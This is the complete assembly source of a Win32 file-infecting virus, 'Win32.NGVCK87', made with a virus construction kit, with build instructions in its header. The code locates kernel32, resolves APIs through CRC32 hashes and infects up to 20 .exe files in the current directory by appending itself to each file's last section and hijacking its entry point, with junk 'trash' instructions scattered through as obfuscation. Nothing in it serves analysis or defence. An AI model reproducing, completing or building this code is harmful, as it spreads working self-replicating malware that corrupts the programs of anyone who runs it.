              
;
;
; Win32.NGVCK87 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK87
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 18
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 sub dword ptr [esp], offset Delta
 pop ebx
                                        ; mov ebp, ebx
                                        ; clear ebp
 mov ebp, 34758d
 sub ebp, 34758d
 add ebp, ebx
 jmp KernelSearchStart


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ecx
 mov ecx, 0

 push ecx
 push ecx
 push 3h
 push ecx
                                        ; add ecx, 1
 sub ecx, -1d
 push ecx
 mov eax, 80000000h or 40000000h
 push eax
 lea esi, [ebp+WFD_szFileName]
 xchg esi, eax

 push eax
 call dword ptr [ebp+XCreateFileA]

 cmp eax, -1
 je Closed

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
                                        ; clear ebx
 mov ebx, 5205d
 sub ebx, 5205d
 xor ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx
 push 0
 add dword ptr [ebp+Trash1], ecx        ; Trash
 push ebx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
 cmp eax, 0
 je CloseFile
                                        ; clear ecx
 mov ecx, -6438d
 add ecx, 6438d
 push ebx
 push ecx
 push ecx
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 dec eax
 inc eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; esi Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 push dword ptr [ebp+NTableVA]
 pop eax


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], eax
 mov ebx, dword ptr [eax]
 sbb ecx, 17d                           ; Trash
 add ebx, [ebp+KernelMZ]
                                        ; mov eax, ebx
 mov eax, ebx
                                        ; mov edi, eax
 mov edi, eax
 mov dword ptr [ebp+TempApisearch2], edi
 push esi
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; esi Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
 mov ecx, dword ptr [ebp+APICRC32]
 sub ecx, dword ptr [esi]
 or ecx, ecx
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop esi
                                        ; mov eax, -1
 mov eax, 0
 add eax, -1d
 and eax, dword ptr [ebp+NTableTemp]
 mov edi, dword ptr [ebp+TempApisearch2]
                                        ; add eax, 4
 add eax, 4d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 mov ebx, 17147254d                     ; Trash
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4d
 add eax, 2763730d                      ; Trash
                                        ; retrieve the offset
 movzx edx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 push edx
 pop eax
 movzx edx, word ptr [eax]
 clc
 rcl edx, 2h
 rol ebx, 13d                           ; Trash
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov eax, dword ptr [ebp+KernelMZ]
 add eax, dword ptr [edx]
 mov dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edx
 popad
 jmp ExecuteHost



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
 adc dword ptr [ebp+Trash1], 1745732    ; Trash


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 push 20d
 pop dword ptr [ebp+InfCounter]
 lea esi, [ebp+filemask]
 xchg esi, edx

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 add eax, 1d
 or eax, eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edi

 mov ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 xor dword ptr [ebp+retBase], ebx



ExecuteHost:                            ; Start the infected File
 sar ebx, 4d                            ; Trash

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov ecx, 35076163d                     ; Trash
 mov eax,12345678h
 org $-4
 retBase dd 0h
 add eax,12345678h
 org $-4
 retEIP dd 0h
 jmp eax



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 xor edx, edx
 mov eax, dword ptr [ebp+AlignReg1]
 div ebx
 sub ecx, ecx                           ; Trash
                                        ; add eax, 1
 add eax, 1d
 mul ebx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 K32Trys     dd 0h
 APICRC32    dd 0h
 KernelPE    dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 NTableVA    dd 0h

 APINames:
 dd 0AA700106h           ; FindNextFileA
 dd 0FFC97C1Fh           ; GetProcAddress
 dd 068624A9Dh           ; CloseHandle
 dd 04134D1ADh           ; LoadLibraryA
 dd 08C892DDFh           ; CreateFileA
 dd 0C200BE21h           ; FindClose
 dd 094524B42h           ; UnmapViewOfFile
 dd 0797B49ECh           ; MapViewOfFile
 dd 096B2D96Ch           ; CreateFileMappingA
 dd 0AE17EBEFh           ; FindFirstFileA

 FileHandle  dd 0h
 CheckSum dd 0h
 XCheckSumMappedFile    dd 0h
 KernelMZ    dd 0h
 MapAddress  dd 0h
 MapHandle   dd 0h
 NewSize     dd 0h
 AlignReg2   dd 0h
 OldEIP      dd 0h

 APIOffsets:
 XFindNextFileA         dd 0h
 XGetProcAddress        dd 0h
 XCloseHandle           dd 0h
 XLoadLibraryA          dd 0h
 XCreateFileA           dd 0h
 XFindClose             dd 0h
 XUnmapViewOfFile       dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileMappingA    dd 0h
 XFindFirstFileA        dd 0h

 Trash2      dd 0h
 CheckSumMFA db 'CheckSumMappedFile',0
 FindHandle  dd 0h
 HeaderSum dd 0h
 AlignReg1   dd 0h
 TempApisearch2 dd 0h
 NTableTemp  dd 0h
 counter     dw 0h
 filemask    db '*.EXe',0
 db 'Win32.NGVCK87 created by SnakeByte',0
 OldBase     dd 400000h
 NewEIP      dd 0h
 Trash1      dd 0h
 InfCounter  dd 0h
 OTableVA    dd 0h
 TempAPI     dd 0h
 Imagehlp    db 'imagehlp.dll',0
 ATableVA    dd 0h




;          [ ///// * APISearch - Procedure * \\\\\ ]

 and edx, 41354235d                     ; Trash

GetApis:                                ; Retrive the APIs we need
 or eax, ebx                            ; Trash
 mov edi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear esi
 mov esi, 0
 add esi, [edi+78h]
 add esi, [ebp+KernelMZ]
 or edx, 20187871d                      ; Trash
                                        ; add esi, 28
 add esi, 28d
                                        ; get ATableVA
 mov edi, dword ptr [esi]
                                        ; add esi, 4
 add esi, 4d
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], edi
                                        ; get NTableVA
 mov edi, dword ptr [esi]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edi
                                        ; add esi, 4
 inc esi
 add esi, 3d
                                        ; get OTableVA
 mov edi, dword ptr [esi]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edi

                                        ; number of API's we're looking for
 push NumberOfApis
 pop eax

                                        ; load API Names and Offsets
 lea edx, [ebp+APIOffsets]
 xchg edx, ebx

 mov esi, offset APINames
 add esi, ebp


GetApisLoop: 
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

                                        ; search 'em
                                        ; esi points to the CRC
                                        ; ebx points to the offset

 call SearchAPI1
                                        ; add esi, 4
 add esi, 4d
 push dword ptr [ebp+TempAPI]
 pop edx
 mov dword ptr [ebx], -1
 and dword ptr [ebx], edx
                                        ; add ebx, 4
 add ebx, 4d
 sub eax, 1
 jnz GetApisLoop
 mov esi, offset XCheckSumMappedFile
 add esi, ebp

 lea eax, [ebp+CheckSumMFA]
 xchg eax, edx

                                        ; mov ecx, 1
 mov ecx, ( 1d xor 34d )
 xor ecx, 34d
 lea eax, [ebp+Imagehlp]
 xchg eax, ebx

 call GetOtherApis
 mov edi, offset Outbreak
 add edi, ebp
 xor ebx, 90368126d                     ; Trash

 push edi
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov eax, dword ptr [esp]
                                        ; store old EIP and ImageBase
                                        ; clear edi
 mov edi, 0
 xor edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edi

 mov ebx, dword ptr [ebp+Trash1]

 mov dword ptr [ebp+Trash2], ebx

                                        ; mov edi, -1
 mov edi, ( -1d xor 1d )
 xor edi, 1d
 and edi, dword ptr [ebp+OldBase]

 push edi
 pop dword ptr [ebp+retBase]


                                        ; round to pages
 shr eax, 16d
 ror eax, 16d
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 64551
 sub dword ptr [ebp+K32Trys], 4551d

GK1:                                    ; check for DOS-EXE Stub
 mov edx, dword ptr [ebp+K32Trys]
 cmp edx, 0h
 jz NoKernel
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je CheckPE

GK2:
 sub eax, 65536d
                                        ; clear edx
 xor edx, edx
 add edx, dword ptr [ebp+K32Trys]
 dec edx
 mov dword ptr [ebp+K32Trys], edx
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
                                        ; add eax, 60
 add eax, 60d
 mov ecx, [eax]
 dec dword ptr [ebp+Trash1]             ; Trash
 add eax, -60d
 xchg ecx, eax
 add eax, ecx
 xchg ecx, eax
                                        ; check for EP
 cmp word ptr [ecx], 'EP'
 je CheckDLL
 or edx, eax                            ; Trash
 jmp GK2

CheckDLL:

KernelFound:
 mov dword ptr [ebp+KernelPE], ecx
 mov dword ptr [ebp+KernelMZ], -1
 and dword ptr [ebp+KernelMZ], eax

 jmp GetApis

;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ecx, 276
 mov ecx, 0
 add ecx, 276d
 lea ebx, [ebp+WFD_szFileName]
 xchg ebx, edx


ClearOldData2:
 mov byte ptr [edx], 0h
                                        ; add edx, 1
 add edx, 1d
 dec ecx
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea edi, [ebp+WIN32_FIND_DATA]
 xchg edi, ebx

 push ebx
 push edx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]
 xchg ecx, eax
 shr edx, 14d                           ; Trash

 push eax
                                        ; clear eax
 push 0
 pop eax
 add eax, dword ptr [ebp+FindHandle]
 add ecx, 42812943d                     ; Trash
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret





;        [ ///// * Retrieve non Kernel API's * \\\\\ ]

GetOtherApis:
 push ecx 
 push edx 
 push ebx
 call dword ptr [ebp+XLoadLibraryA]
 pop edx 
 pop ecx 
                                        ; mov ebx, eax
 push eax
 pop ebx
GetOtherApiLoop:
 push ecx 
 push edx 
 push edx
 push ebx
 call dword ptr [ebp+XGetProcAddress]
 pop edx 
 pop ecx 
 mov dword ptr [esi], eax
 mov eax, 53221309d                     ; Trash
                                        ; add esi, 4
 add esi, 4d
 dec ecx
 cmp ecx, 0
 je GetOtherApiEnd
GetOtherApiLoop2:
                                        ; add edx, 1
 inc edx
 cmp byte ptr [edx], 0
 jne GetOtherApiLoop2
                                        ; add edx, 1
 inc edx
 jmp GetOtherApiLoop
GetOtherApiEnd:
ret



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov edx, [ecx+3Ch]
 add edx, ecx
                                        ; get File Alignment
 mov ebx, [edx+3Ch]
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ecx
                                        ; calculate new size
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], ecx
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], ebx
 call Align
                                        ; mov ecx, -1
 push -1d
 pop ecx
 and ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 add dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 add dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov eax, dword ptr [esi+3Ch]
 add eax, esi
                                        ; infect by increasing the last section
 push eax
 pop esi
                                        ; get last section
 movzx ebx, word ptr [esi+06h]
 dec ebx
 imul ebx, ebx, 28h
                                        ; add eax, 120
 inc eax
 add eax, 119d
 add eax, ebx
                                        ; clear edx
 and edx, 0
 add edx, dword ptr [esi+74h]
 sal edx, 3
 add eax, edx
                                        ; get old Entrypoint
 mov ebx, dword ptr [esi+28h]
 xor ecx, 22509259d                     ; Trash
 mov dword ptr [ebp+OldEIP], 0
 add dword ptr [ebp+OldEIP], ebx
 mov ecx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], ecx
                                        ; clear ebx
 mov ebx, 0

 add ebx, [eax+10h]
                                        ; mov edx, ebx
 push ebx
 pop edx
 add eax, 14h
 add ebx, [eax]
 sub eax, 14h
 push ebx
 mov ecx, edx
 add eax, 0Ch
 add ecx, [eax]
 sub eax, 0Ch
 mov dword ptr [ebp+NewEIP], ecx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], ecx
 xor dword ptr [ebp+Trash1], 609778     ; Trash
                                        ; clear ecx
 mov ecx, 0

 add ecx, [eax+10h]
 push ecx
                                        ; calculate new section size
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], ecx
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 sub dword ptr [ebp+Trash1], 1080140    ; Trash
 call Align
                                        ; clear ecx
 and ecx, 0
 add ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [eax+10h], 0h
 add dword ptr [eax+10h], ecx
 sub dword ptr [ebp+Trash1], 1793436    ; Trash
 pop ecx
 sub dword ptr [ebp+Trash1], 495137     ; Trash
 add ecx, VirusSize
 mov dword ptr [eax+08h], 0
 add dword ptr [eax+08h], ecx
 mov ecx, dword ptr [eax+0Ch]
 add ecx, dword ptr [eax+10h]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], ecx
                                        ; set write, read and code flag
 or dword ptr [eax+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 lea ebx, [ebp+Virus]
 xchg ebx, esi
 neg eax                                ; Trash

 add edi, dword ptr [ebp+MapAddress]
 mov edx, VirusSize

AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
 cmp dword ptr [ebp+XCheckSumMappedFile], -1d
 je NoCheckSum
 mov ecx, offset CheckSum
 add ecx, ebp

 push ecx
 lea eax, [ebp+HeaderSum]
 or ebx, ebx                            ; Trash
 xchg ecx, eax

 push ecx
 mov ebx, dword ptr [ebp+NewSize]
 push ebx
                                        ; clear ecx
 mov ecx, 13787d
 sub ecx, 13787d
 xor ecx, dword ptr [ebp+MapAddress]
 push ecx
 call dword ptr [ebp+XCheckSumMappedFile]
 mov ecx, dword ptr [ebp+MapAddress]
 ror ebx, 28d                           ; Trash
 mov ecx, [ecx+3Ch]
 adc dword ptr [ebp+Trash1], ebx        ; Trash
 add ecx, dword ptr [ebp+MapAddress]
 mov ebx, dword ptr [ebp+CheckSum]
 mov dword ptr [ecx+58h], ebx
NoCheckSum:
                                        ; decrease Infection Counter
 mov ecx, dword ptr [ebp+InfCounter]
 sub ecx, 1
 mov dword ptr [ebp+InfCounter], ecx
 clc
ret

NoEXE:
 stc
ret



;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov esi, edi
                                        ; clear esi
 mov esi, 0
 add esi, edi
                                        ; mov edx, edi
 push edi
 pop edx
LenCRC:
                                        ; add edx, 1
 add edx, 1d
 cmp byte ptr [edx], 0
 jne LenCRC
 sub edx, esi
                                        ; mov edi, edx
 push edx
 pop edi
                                        ; add edi, 1
 inc edi
 cld
                                        ; clear eax
 mov eax, 0
 sub eax, 1
                                        ; mov ecx, eax
 mov ecx, eax
NextByteCRC:
                                        ; clear edx
 mov edx, 38474d
 sub edx, 38474d
                                        ; clear ebx
 xor ebx, ebx
 mov dl, byte ptr [esi]
                                        ; add esi, 1
 inc esi
 xor dl, al
 mov al, ah
 mov ah, cl
 mov cl, ch
 mov ch, 8
NextBitCRC:
 shr bx, 1
 rcr dx, 1
jnc NoCRC
 xor dx,08320h
 xor bx,0EDB8h
NoCRC:
 dec ch
jnz NextBitCRC
 xor eax, edx
 xor ecx, ebx
 dec edi
jnz NextByteCRC
 not ecx
 not eax
 mov edx, ecx
 rol edx, 16d
 mov dx, ax
 mov dword ptr [ebp+APICRC32], edx
 popad
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for maximum filesize
 sal edx, 4d                            ; Trash
 lea esi, [ebp+WFD_nFileSizeHigh]
 xchg esi, ecx

 cmp dword ptr [ecx], 0
 jne NoInfection
                                        ; check for minimum filesize
 lea ecx, [ebp+WFD_nFileSizeLow]

 cmp dword ptr [ecx], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov eax, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je Goodfile
                                        ; clear edx
 mov edx, 51348d
 sub edx, 51348d
                                        ; add edx, 1
 add edx, 1d
 sub edx, 1
 jz Notagoodfile

Goodfile:
                                        ; clear ecx
 sub ecx, ecx
 mov cx, word ptr [eax+3Ch]
 cmp ecx, 0
 je Notagoodfile
 inc edx                                ; Trash
 push dword ptr [eax+3Ch]
 pop edi
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edi
 jb Notagoodfile
 add edi, eax
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edi], 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edi+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for OBJ
 mov bx, word ptr [edi+16h]
 and bx, 00002h
 cmp bx, 00002h
 jne Notagoodfile
 xor dword ptr [ebp+Trash1], 1262403    ; Trash
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 sbb ecx, 4d                            ; Trash
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

